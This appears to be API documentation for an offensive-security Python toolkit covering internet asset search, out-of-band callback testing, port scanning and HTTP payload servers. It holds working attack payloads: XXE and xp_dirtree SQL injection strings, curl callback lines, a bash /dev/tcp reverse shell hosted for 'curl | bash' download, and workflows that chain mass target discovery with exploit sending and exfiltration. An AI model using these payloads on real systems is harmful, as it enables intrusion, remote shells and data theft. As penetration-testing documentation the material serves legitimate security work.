# Reconnaissance APIs

APIs for asset discovery, port scanning, service detection, and OOB testing.

## Search Engines

### Fofa

FOFA (Cyberspace Assets Retrieval) search engine for discovering internet-connected assets.

**Initialization:**

```python
from ofx.api.search import FofaClient

# Interactive mode (prompts for credentials)
fofa = FofaClient()

# Programmatic mode
fofa = FofaClient(user="email@example.com", token="your_api_token")

# Custom config location
fofa = FofaClient(conf_path=Path("/custom/path/config.ini"))
```

**Basic Search:**

```python
# Simple search
results = fofa.search('title="login"')

# Multi-page search
results = fofa.search('app="Apache" && country="US"', pages=3)

# Access results (URLs)
for url in results:
    print(url)
```

**Advanced Queries:**

```python
# Multiple conditions
results = fofa.search('protocol="http" && status_code="200" && country="CN"')

# Version detection
results = fofa.search('app="Apache" && version="2.4.41"')

# Certificate search
results = fofa.search('cert="example.com"')

# ASN search
results = fofa.search('asn="12345"')
```

**Practical Examples:**

```python
# Find exposed admin panels
admin_panels = fofa.search('title="Admin Panel" || title="Dashboard"', pages=5)
for panel_url in admin_panels:
    print(f"Found admin panel: {panel_url}")

# Find specific vulnerabilities
vulnerable = fofa.search('app="Apache Struts" && version="2.3.15"')

# Search by organization
company_assets = fofa.search('org="Example Corp"', pages=3)

# Export results
import json
with open('targets.json', 'w') as f:
    json.dump(sorted(results), f, indent=2)
```

### Shodan

Internet-wide scanning and service detection.

```python
from ofx.api.search import ShodanClient

# Initialize
shodan = ShodanClient(token="your_api_key")

# Search
results = shodan.search('apache')

# Filter by port
results = shodan.search('port:22')

# Country-specific
results = shodan.search('apache country:"US"')
```

### ZoomEye

Cyberspace search engine for comprehensive asset discovery.

```python
from ofx.api.search import ZoomEyeClient

# Initialize
zoomeye = ZoomEyeClient(token="your_api_key")

# Web search
results = zoomeye.search('app:apache')

# Alternate query
results = zoomeye.search('port:80 +country:cn')
```

## Out-of-Band Testing

### CEye

Monitor DNS and HTTP callbacks for blind vulnerability detection.

**Setup:**

```python
from ofx.api.oob import CEyeClient

# Interactive setup
ceye = CEyeClient()

# Programmatic setup
ceye = CEyeClient(token="your_ceye_token")
```

**DNS Callbacks:**

```python
# Generate unique DNS subdomain
payload = ceye.build_request('test_data', type='dns')
dns_domain = payload['url']  # e.g., "xxxxx.ceye.io"
flag = payload['flag']  # Unique identifier

# Use in exploit (example: command injection)
exploit = f"curl http://{dns_domain}"

# Wait for callback
time.sleep(5)

# Verify callback received
if ceye.verify_request(flag, type='dns'):
    print("DNS callback received - vulnerability confirmed!")
```

**HTTP Callbacks:**

```python
# Generate unique HTTP URL
payload = ceye.build_request('exfil_data', type='http')
http_url = payload['url']  # e.g., "http://xxxxx.ceye.io"

# Use in exploit (example: SSRF)
exploit_payload = {
    'url': http_url,
    'data': 'sensitive_info'
}

# Check for HTTP requests
if ceye.verify_request(payload['flag'], type='http'):
    print("HTTP callback received!")
    exfil = ceye.exact_request(payload['flag'], type='http')
    if exfil:
        print(f"Exfiltrated: {exfil}")
```

**Practical Examples:**

```python
# XXE Detection
xxe_payload = ceye.build_request('xxe_test', type='http')
xml = f'''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "{xxe_payload['url']}">
]>
<data>&xxe;</data>'''

# Send XML and verify
# ... send xml to target ...
if ceye.verify_request(xxe_payload['flag'], type='http'):
    print("XXE vulnerability confirmed!")

# SQL Injection OOB
sqli_payload = ceye.build_request('sqli', type='dns')
sql = f"'; EXEC master..xp_dirtree '//{sqli_payload['url']}/a';--"

# SSRF Detection
ssrf_payload = ceye.build_request('ssrf', type='http')
if ceye.verify_request(ssrf_payload['flag']):
    print("SSRF vulnerability exists!")
```

### Interactsh

Self-hosted OOB interaction server.

```python
from ofx.api.oob import InteractshClient

# Initialize
interactsh = InteractshClient()

# Generate a unique URL + flag
url, flag = interactsh.build_request(method="http")

# Use in payload
payload = f"curl {url}"

# Poll for interactions
interactions = interactsh.poll()
for interaction in interactions:
    print(f"Protocol: {interaction['protocol']}")
    print(f"Request: {interaction['raw-request']}")
```

## Network Scanning

### PortScanner

Fast port discovery with service detection.

```python
from ofx.api.network import PortScanner

# Initialize
scanner = PortScanner()

# Scan common ports
results = scanner.scan('192.168.1.100', ports=[80, 443, 8080, 3306, 22])

# Scan port range
results = scanner.scan('10.0.0.1', ports=range(1, 1024))

# Scan with custom timeout
results = scanner.scan('target.com', ports=[80, 443], timeout=2)

# Process results
for result in results:
    if result['status'] == 'open':
        print(f"Port {result['port']} is open")
        if 'service' in result:
            print(f"Service: {result['service']}")
```

### ServiceGrabber

Banner grabbing and service detection.

```python
from ofx.api.network import ServiceGrabber

grabber = ServiceGrabber()

# Grab banner
info = grabber.grab('192.168.1.100', 22)
print(f"Banner: {info.get('banner')}")
print(f"Service: {info.get('service')}")

# HTTP information
http_info = grabber.grab_http('example.com', 80)
print(f"Server: {http_info.get('server')}")
print(f"Status: {http_info.get('status_code')}")
print(f"Title: {http_info.get('title')}")
```

### DNSResolver

DNS record enumeration.

```python
from ofx.api.network import DNSResolver

resolver = DNSResolver()

# A records
a_records = resolver.query('example.com', record_type='A')

# MX records
mx_records = resolver.query('example.com', record_type='MX')

# All common records
all_records = resolver.query_all('example.com')
for record_type, records in all_records.items():
    print(f"{record_type}: {records}")
```

### SubdomainEnumerator

Wildcard-aware subdomain discovery.

```python
from ofx.api.network import SubdomainEnumerator

# Initialize with wordlist
enumerator = SubdomainEnumerator(
    domain='example.com',
    wordlist='/path/to/subdomains.txt'
)

# Enumerate subdomains
subdomains = enumerator.enumerate()
for subdomain in subdomains:
    print(f"Found: {subdomain}")

# Use built-in wordlist
enumerator = SubdomainEnumerator(domain='example.com')
enumerator.enumerate(threads=10)
```

## HTTP Server

> **Note:** For comprehensive HTTP server documentation including `SimpleHTTPServer`, `PayloadServer`, `ExfilServer`, and custom server creation, see [HTTP Server API](httpserver.md).

### PHTTPServer

Low-level HTTP/HTTPS server with SSL support. Multiple instances can run simultaneously on different ports.

**Basic Usage:**

```python
from ofx.api.httpserver import PHTTPServer

# Simple HTTP server
server = PHTTPServer(bind_ip='0.0.0.0', bind_port=8080)
server.start(daemon=True)

print(f"Server running at: {server.url}")
# Server running at: http://192.168.1.100:8080

# Keep server running
import time
time.sleep(300)  # Run for 5 minutes
server.stop()
```

**HTTPS Server:**

```python
# Auto-generate self-signed certificate
server = PHTTPServer(
    bind_ip='0.0.0.0',
    bind_port=443,
    use_https=True
)

# Start in background
server.start(daemon=True)

print(f"HTTPS Server: {server.url}")
# HTTPS Server: https://192.168.1.100:443
```

**Running Multiple Servers:**

```python
from ofx.api.httpserver import PHTTPServer, SimpleHTTPServer, PayloadServer

# Run multiple servers simultaneously
server1 = SimpleHTTPServer(port=8000)
server2 = PayloadServer(port=8080)

server1.start()
server2.start()

print(f"File server: {server1.url}")
print(f"Payload server: {server2.url}")

server1.stop()
server2.stop()
```

**Practical Examples:**

```python
# Host reverse shell payload
from pathlib import Path

# Create payload directory
payload_dir = Path('/tmp/payloads')
payload_dir.mkdir(exist_ok=True)

# Write reverse shell script
reverse_shell = '''#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
'''
(payload_dir / 'shell.sh').write_text(reverse_shell)

# Start server
from ofx.api.httpserver import SimpleHTTPServer
server = SimpleHTTPServer(port=8080, directory=str(payload_dir))
server.start(daemon=True)

print(f"Download with: curl {server.url}/shell.sh | bash")

# IPv6 support
server_v6 = PHTTPServer(bind_ip='::', bind_port=8080)
server_v6.start(daemon=True)
```

## Workflow Integration

**Comprehensive Recon Workflow:**

```yaml
name: Asset Reconnaissance

inputs:
  target_query:
    description: "FOFA search query"
    required: true
  max_targets:
    description: "Maximum targets to scan"
    default: 50

jobs:
  discover:
    steps:
      - name: FOFA Search
        script: |
          from ofx.api.search import FofaClient
          fofa = FofaClient()
          results = fofa.search('{{ inputs.target_query }}', size={{ inputs.max_targets }})
          targets = [r['ip'] for r in results]
          print(f"targets={','.join(targets)}")
        outputs:
          targets: "{{ step.targets }}"
      
      - name: Port Scan
        script: |
          from ofx.api.network import PortScanner
          scanner = PortScanner()
          all_results = []
          for target in "{{ steps.0.outputs.targets }}".split(','):
              results = scanner.scan(target, ports=[80,443,22,3306])
              all_results.append({
                  'host': target,
                  'open_ports': [r['port'] for r in results if r['status'] == 'open']
              })
          print(f"scan_results={all_results}")
        outputs:
          scan_results: "{{ step.scan_results }}"
      
      - name: Service Detection
        script: |
          from ofx.api.network import ServiceGrabber
          import json
          
          grabber = ServiceGrabber()
          scan_results = {{ steps.1.outputs.scan_results }}
          
          for result in scan_results:
              for port in result['open_ports']:
                  info = grabber.grab(result['host'], port)
                  print(f"{result['host']}:{port} - {info.get('banner', 'No banner')}")
```

**OOB Testing Workflow:**

```yaml
name: Blind XXE Detection

jobs:
  test_xxe:
    steps:
      - name: Generate OOB Payload
        script: |
          from ofx.api.oob import CEyeClient
          ceye = CEyeClient()
          payload = ceye.build_request('xxe_test', type='http')
          xml = f'''<?xml version="1.0"?>
          <!DOCTYPE data [
            <!ENTITY xxe SYSTEM "{payload['url']}/data.txt">
          ]>
          <data>&xxe;</data>'''
          print(f"payload={payload}")
          print(f"xml={xml}")
        outputs:
          payload: "{{ step.payload }}"
          xml: "{{ step.xml }}"
      
      - name: Send Exploit
        script: |
          import requests
          xml = '''{{ steps.0.outputs.xml }}'''
          response = requests.post(
              '{{ inputs.target_url }}',
              data=xml,
              headers={'Content-Type': 'application/xml'}
          )
      
      - name: Verify Callback
        script: |
          import time
          from ofx.api.oob import CEyeClient
          
          time.sleep(5)
          ceye = CEyeClient()
          payload = {{ steps.0.outputs.payload }}
          
          if ceye.verify_request(payload['flag'], type='http'):
              print("XXE Vulnerability Confirmed!")
              exfil = ceye.exact_request(payload['flag'], type='http')
              if exfil:
                  print(f"Exfiltrated: {exfil}")
          else:
              print("No callback received")
```
